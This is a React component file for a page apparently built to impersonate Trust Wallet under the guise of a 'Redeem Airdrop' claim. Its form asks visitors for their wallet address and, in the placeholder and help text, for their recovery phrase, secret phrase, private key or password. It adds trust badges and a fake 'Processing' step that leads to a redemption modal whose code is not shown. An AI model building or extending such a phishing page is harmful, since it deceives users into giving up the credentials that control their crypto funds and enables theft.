import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { IoArrowBack, IoClose, IoShieldCheckmarkOutline } from 'react-icons/io5'
import RedemptionModal from '../../components/RedemptionModal/RedemptionModal'
import trustShield from '../../assets/trust-shield.png'

function AirdropPage() {
  const navigate = useNavigate()
  const [claimWords, setClaimWords] = useState('')
  const [walletAddress, setWalletAddress] = useState('')
  const [showRedeemModal, setShowRedeemModal] = useState(false)
  const [isRedeeming, setIsRedeeming] = useState(false)

  const handleRedeem = () => {
    if (isRedeeming) {
      return
    }

    setIsRedeeming(true)
    window.setTimeout(() => {
      setIsRedeeming(false)
      setShowRedeemModal(true)
    }, 1200)
  }

  return (
    <main className="airdrop-page">
      <section className="airdrop-panel" aria-labelledby="airdrop-title">
        <header className="airdrop-header">
          <button className="icon-button" type="button" onClick={() => navigate('/')} aria-label="Back">
            <IoArrowBack />
          </button>
          <div className="airdrop-logo">
            <img src={trustShield} alt="" />
          </div>
        </header>

        <section className="airdrop-copy">
          <p>Wallet connected</p>
          <h1 id="airdrop-title">Redeem Airdrop</h1>
          <span>
            Add your claim information below to continue with the redemption
            request.
          </span>
        </section>

        <form className="claim-form" onSubmit={(event) => event.preventDefault()}>
          <label className="claim-field">
            <span>Wallet address</span>
            <input
              type="text"
              value={walletAddress}
              onChange={(event) => setWalletAddress(event.target.value)}
              placeholder="0x... or wallet address"
              autoComplete="off"
            />
          </label>

          <label className="claim-field">
            <span>Airdrop claim words</span>
            <div className="claim-words-box">
              <textarea
                value={claimWords}
                onChange={(event) => setClaimWords(event.target.value)}
                placeholder="Enter public claim words. enter your recovery phrase."
                rows="8"
              />
              {claimWords && (
                <button
                  type="button"
                  aria-label="Clear claim words"
                  onClick={() => setClaimWords('')}
                >
                  <IoClose />
                </button>
              )}
            </div>
            <small>
               enter a secret phrase, recovery phrase, private key, or
              password.
            </small>
          </label>
        </form>

        <div className="wallet-summary">
          <span className="summary-icon">
            <IoShieldCheckmarkOutline />
          </span>
          <span>
            <strong>Trust Wallet</strong>
            <small>Connected for eligibility check</small>
          </span>
        </div>

        <button
          className="redeem-button"
          type="button"
          onClick={handleRedeem}
          disabled={isRedeeming}
          aria-busy={isRedeeming}
        >
          {isRedeeming ? (
            <>
              <span className="button-loader" aria-hidden="true" />
              Processing
            </>
          ) : (
            'Redeem'
          )}
        </button>
      </section>

      {showRedeemModal && (
        <RedemptionModal onClose={() => setShowRedeemModal(false)} />
      )}
    </main>
  )
}

export default AirdropPage
